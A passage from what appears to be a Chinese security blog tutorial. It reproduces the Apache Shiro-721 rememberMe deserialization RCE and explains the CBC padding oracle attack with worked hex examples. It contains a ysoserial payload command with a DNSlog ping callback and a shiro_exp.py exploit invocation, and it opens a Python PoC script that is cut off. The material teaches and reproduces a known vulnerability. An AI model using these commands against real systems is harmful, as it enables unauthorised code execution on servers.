填充规则的密文块。</li></ul></li><li><p>构造反序列化载荷</p><ul><li>将恶意序列化数据（如 CommonsCollections 利用链）加密后替换到 <code>rememberMe</code> 字段，触发服务端反序列化，最终执行任意代码</li></ul><p>Padding正确，服务器正常响应</p><p>Padding错误，服务器返回<code>Set-Cookie: rememberMe=deleteMe</code></p></li></ol><h2 id="七、Shiro-721复现"><a href="#七、Shiro-721复现" class="headerlink" title="七、Shiro-721复现"></a>七、Shiro-721复现</h2><ol><li><strong>获取 <code>rememberMe</code> cookie</strong></li></ol><ul><li>在目标应用的登录页面中，输入有效的用户名和密码，勾选 <code>rememberMe</code> 选项。</li><li>使用 <strong>Burp Suite</strong> 代理拦截并获取包含加密认证信息的 <code>rememberMe</code> cookie。</li></ul><ol start="2"><li><strong>使用 DNSlog 获取临时域名</strong></li></ol><ul><li>在 DNSlog 服务平台（例如 <code>dnslog.cn</code>）注册并获取一个临时的域名（如 <code>1075l1.dnslog.cn</code>）。</li><li>攻击者利用此域名用于验证漏洞是否被成功利用（目标系统会向该域名发送 DNS 请求）。</li></ul><ol start="3"><li><strong>使用 <code>ysoserial</code> 生成攻击载荷</strong></li></ol><ul><li><p>使用 <code>ysoserial</code> 工具生成恶意的反序列化对象。<code>ysoserial</code> 是一个用于构造 Java 反序列化漏洞利用链的工具。</p></li><li><p>选择 <code>CommonsBeanutils1</code> 作为攻击链，并将命令（如 <code>ping 1075l1.dnslog.cn</code>）嵌入 payload 中。</p></li><li><p>执行命令生成 payload.class文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsBeanutils1 <span class="hljs-string">&quot;ping 1075l1.dnslog.cn&quot;</span> &gt; payload.class<br></code></pre></td></tr></table></figure></li></ul><ol start="4"><li><strong>通过 Padding Oracle 攻击解密并篡改 <code>rememberMe</code></strong></li></ol><ul><li>利用获取到的 <code>rememberMe</code> cookie 值作为前缀，结合生成的 payload 进行 Padding Oracle 攻击。</li><li>Padding Oracle 攻击利用了加密算法的填充机制，通过错误响应信息逐步破解加密内容。</li></ul><ol start="5"><li><strong>执行攻击脚本触发 RCE</strong></li></ol><ul><li><p>使用 <code>shiro_exp.py</code> 脚本触发最终的攻击，执行远程命令。</p></li><li><p>输入目标 URL、<code>rememberMe</code> cookie 和生成的 <code>payload.class</code> 文件，通过 Python 脚本触发反序列化攻击：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python shiro_exp.py http://&lt;目标 IP&gt;:&lt;端口&gt; [rememberMeCookie] payload.class<br></code></pre></td></tr></table></figure></li><li><p>脚本会利用 <code>rememberMe</code> cookie 和攻击载荷，进行反序列化操作，从而执行命令（如 <code>ping</code>）来确认攻击是否成功。</p></li></ul><h3 id="Padding-Oracle-Attack-原理"><a href="#Padding-Oracle-Attack-原理" class="headerlink" title="Padding Oracle Attack 原理"></a>Padding Oracle Attack 原理</h3><h4 id="1、根源"><a href="#1、根源" class="headerlink" title="1、根源"></a><strong>1、根源</strong></h4><p>这个攻击的根源是明文分组和填充，同时应用程序对于填充异常的响应可以作为反馈，例如请求<code>http://www.example.com/decrypt.jsp?data=0000000000000000EFC2807233F9D7C097116BB33E813C5E</code>，当攻击者在篡改data值时会有以下不同的响应：</p><ul><li>如果data值没有被篡改，则解密成功，并且业务校验成功，响应200</li><li>如果data值被篡改，服务端无法完成解密，解密校验失败，则响应500</li><li>如果data值被篡改，但是服务端解密成功，但业务逻辑校验失败，则可能返回200或302等响应码,而不是响应500</li></ul><p>攻击者只需要关注解密成功和解密失败的响应即可（第三种属于解密成功的响应），即可完成攻击</p><h4 id="2、破解明文"><a href="#2、破解明文" class="headerlink" title="2、破解明文"></a><strong>2、破解明文</strong></h4><p>以一个例子进行猜解，假设有这样一个应用，请求如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">http</span>:<span class="hljs-comment">//www.example.com/decrypt.jsp?data=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6</span><br></code></pre></td></tr></table></figure><p>即client给server提交的参数为<code>7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6</code> 才能请求正常的服务</p><h5 id="（1）上帝视角"><a href="#（1）上帝视角" class="headerlink" title="（1）上帝视角"></a><strong>（1）上帝视角</strong></h5><p>加密过程</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071847462.png" alt="img"></p><p>解密过程</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071845580.png" alt="img"></p><p>关注上图绿色圈起来的部分，解密之后的最后一个数据块，其结尾应该包含正确的填充序列。如果这点没有满足，那么加&#x2F;解密程序就会抛出一个填充异常。Padding Oracle Attack的关键就是利用程序是否抛出异常来判断padding是否正确。</p><h5 id="（2）攻击者视角"><a href="#（2）攻击者视角" class="headerlink" title="（2）攻击者视角"></a><strong>（2）攻击者视角</strong></h5><p>现在让我们来看看在不知道明文的情况下，如何猜解出明文。首先我们将密文分组，前面8个字节为初始化向量，后面16个字节为加密后的数据：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">初始化向量：7B  <span class="hljs-number">21</span>  6A  <span class="hljs-number">63</span>  <span class="hljs-number">49</span>  <span class="hljs-number">51</span>  <span class="hljs-number">17</span>  0F<br>第一组密文：<span class="hljs-variable constant_">F8</span>  <span class="hljs-number">51</span>  <span class="hljs-variable constant_">D6</span>  <span class="hljs-variable constant_">CC</span>  <span class="hljs-number">68</span>  <span class="hljs-variable constant_">FC</span>  <span class="hljs-number">95</span>  <span class="hljs-number">37</span><br>第二组密文：<span class="hljs-number">85</span>  <span class="hljs-number">87</span>  <span class="hljs-number">95</span>  <span class="hljs-variable constant_">A2</span>  8E  <span class="hljs-variable constant_">D4</span>  <span class="hljs-variable constant_">AA</span>  <span class="hljs-variable constant_">C6</span><br></code></pre></td></tr></table></figure><p>我们来看如何通过构造前面初始向量来破解第一组密文：<code>http://www.example.com/decrypt.jsp?data=7B216A634951170FF851D6CC68FC9537</code></p><ul><li>将初始化向量全部设置为0，提交如下请求<code>http://www.example.com/decrypt.jsp?data=00000000000000000F851D6CC68FC9537</code> ，服务器势必会解密失败，返回HTTP 500，那是因为在对数据进行解密的时候，明文最后一个字节的填充是<code>0x3D</code>,不满足填充规则，校验失败，此时示意图如下：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071845769.png" alt="img"></p><ul><li>依次将初始化向量最后一个字节从<code>0x01~0xFF</code>递增，直到解密的明文最后一个字节为<code>0x01</code>，成为一个正确的padding，当初始化向量为<code>000000000000003C</code>时，成功了，服务器返回HTTP 200，解密示意图如下：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071845703.png" alt="img"></p><ul><li>我们已知构造成功的IV最后一个字节为<code>0x3C</code>，最后一个填充字符为<code>0x01</code>，则我们能通过XOR计算出，第一组密文解密后的中间值最后一个字节：<code>0x01 xor 0x3C = 0x3D</code>; 重点：第一组密文解密的中间值是一直不变的，同样也是正确的，我们通过构造IV值，使得最后一位填充值满足0x01，符合padding规则，则意味着程序解密成功（当前解密的结果肯定不是原来的明文），通过循环测试的方法，猜解出中间值的最后一位，再利用同样的方式猜解前面的中间值，直到获取到完整的中间值</li><li>下面我们将构造填充值为<code>0x02 0x02</code>的场景，即存在2个填充字节，填充值为<code>0x02</code>，此时我们已经知道了中间值得最后一位为<code>0x3D</code>,计算出初始向量的最后一位为 <code>0x3D xor 0x02 = 0x3F</code>, 即初始向量为<code>0000000000000003F</code>，遍历倒数第二个字节从<code>0x00~0xFF</code>，直到响应成功，猜解出中间值得后两个字节分别为 <code>0x26 0x3D</code>，示例图如下：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071845760.png" alt="img"></p><ul><li>通过同样的方式，完成第一组密文中间值的猜解</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071845764.png" alt="img"></p><ul><li>当第一组密文的中间值猜解成功后，我们将中间值和已知的IV做异或，则得到第一组密文的明文</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-number">0x39</span> <span class="hljs-number">0x73</span> <span class="hljs-number">0x23</span> <span class="hljs-number">0x22</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x6A</span> <span class="hljs-number">0x26</span> <span class="hljs-number">0x3D</span> <br>xor <br><span class="hljs-number">0x7B</span> <span class="hljs-number">0x21</span> <span class="hljs-number">0x6A</span> <span class="hljs-number">0x63</span> <span class="hljs-number">0x49</span> <span class="hljs-number">0x51</span> <span class="hljs-number">0x17</span> <span class="hljs-number">0x0F</span><br>= <br><span class="hljs-variable constant_">BRIAN</span>;<span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><ul><li>续破解第二组密文，第二组密文的IV向量是第一组密文，按照上述的逻辑构造第一组密文，即可破解出第二组明文</li></ul><h4 id="3、伪造密文"><a href="#3、伪造密文" class="headerlink" title="3、伪造密文"></a><strong>3、伪造密文</strong></h4><p>我们已经知道了中间值，那么只需传递指定的IV，就能制造任意想要的密文，如加密<code>TEST</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071845270.png" alt="img"></p><h4 id="4、脚本"><a href="#4、脚本" class="headerlink" title="4、脚本"></a><strong>4、脚本</strong></h4><h5 id="（1）perl"><a href="#（1）perl" class="headerlink" title="（1）perl"></a><strong>（1）perl</strong></h5><p><a href="https://github.com/AonCyberLabs/PadBuster">https://github.com/AonCyberLabs/PadBuster</a></p><h5 id="（2）python2"><a href="#（2）python2" class="headerlink" title="（2）python2"></a><strong>（2）python2</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Padding Oracle Attack POC(CBC-MODE)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Author: axis(axis@ph4nt0m.org)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    http://hi.baidu.com/aullik5</span><br><span class="hljs-string"></span><br><span class="hljs-string">    2011.9</span><br><span class="hljs-string"></span><br><span class="hljs-string"> </span><br><span class="hljs-string"></span><br><span class="hljs-string">    This program is based on Juliano Rizzo and Thai Duong&#x27;s talk on </span><br><span class="hljs-string"></span><br><span class="hljs-string">    Practical Padding Oracle Attack.(http://netifera.com/research/)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> </span><br><span class="hljs-string"></span><br><span class="hljs-string">    For Education Purpose Only!!!</span><br><span class="hljs-string"></span><br><span class="hljs-string"> </span><br><span class="hljs-string"></span><br><span class="hljs-string">    This program is free software: you can redistribute it and/or modify</span><br><span class="hljs-string"></span><br><span class="hljs-string">    it under the terms of the GNU General Public License as published by</span><br><span class="hljs-string"></span><br><span class="hljs-string">    the Free Software Foundation, either version 3 of the License, or</span><br><span class="hljs-string"></span><br><span class="hljs-string">    (at your option) any later version.</span><br><span class="hljs-string"></span><br><span class="hljs-string"> </span><br><span class="hljs-string"></span><br><span class="hljs-string">    This program is distributed in the hope that it will be useful,</span><br><span class="hljs-string"></span><br><span class="hljs-string">    but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="hljs-string"></span><br><span class="hljs-string">    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="hljs-string"></span><br><span class="hljs-string">    GNU General Public License for more details.</span><br><span class="hljs-string"></span><br><span class="hljs-string"> </span><br><span class="hljs-string"></span><br><span class="hljs-string">    You should have received a copy of the GNU General Public License</span><br><span class="hljs-string"></span><br><span class="hljs-string">    along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br> <br><br><span class="hljs-keyword">import</span> sys<br><br> <br><br><span class="hljs-comment"># https://www.dlitz.net/software/pycrypto/</span><br><br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">import</span> binascii<br><br> <br><br><span class="hljs-comment"># the key for encrypt/decrypt</span><br><br><span class="hljs-comment"># we demo the poc here, so we need the key</span><br><br><span class="hljs-comment"># in real attack, you can trigger encrypt/decrypt in a complete blackbox env</span><br><br>ENCKEY = <span class="hljs-string">&#x27;abcdefgh&#x27;</span><br><br> <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">args</span>):<br><br>  <span class="hljs-built_in">print</span> <br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=== Padding Oracle Attack POC(CBC-MODE) ===&quot;</span><br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=== by axis ===&quot;</span><br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=== axis@ph4nt0m.org ===&quot;</span><br><br>  <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;=== 2011.9 ===&quot;</span><br><br>  <span class="hljs-built_in">print</span> <br><br> <br><br>  <span class="hljs-comment">########################################</span><br><br>  <span class="hljs-comment"># you may config this part by yourself</span><br><br>  iv = <span class="hljs-string">&#x27;12345678&#x27;</span><br><br>  plain = <span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaX&#x27;</span><br><br>  plain_want = <span class="hljs-string">&quot;opaas&quot;</span><br><br> <br><br>  <span class="hljs-comment"># you can choose cipher: 